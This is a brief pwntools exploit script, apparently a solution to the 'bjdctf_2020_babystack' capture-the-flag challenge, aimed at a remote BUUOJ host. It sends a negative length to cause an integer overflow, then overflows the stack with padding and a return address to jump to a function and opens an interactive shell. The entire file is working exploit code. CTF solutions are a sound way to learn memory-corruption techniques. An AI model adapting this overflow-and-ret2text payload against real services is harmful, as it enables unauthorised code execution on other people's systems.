#Made by fly_autumn
#x64 ret2text + integar overflow
from pwn import *
#p = process("./bjdctf_2020_babystack")
p = remote("node5.buuoj.cn",29692)
elf = ELF("./bjdctf_2020_babystack")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="amd64")

func_plt = 0x4006ea
p.recvuntil(b"[+]Please input the length of your name:\n")
p.sendline(b"-1")
p.recvuntil(b"[+]What's u name?\n")
offset = 0x18
payload = b"\x00" * offset + p64(func_plt)
p.sendline(payload)

p.interactive()
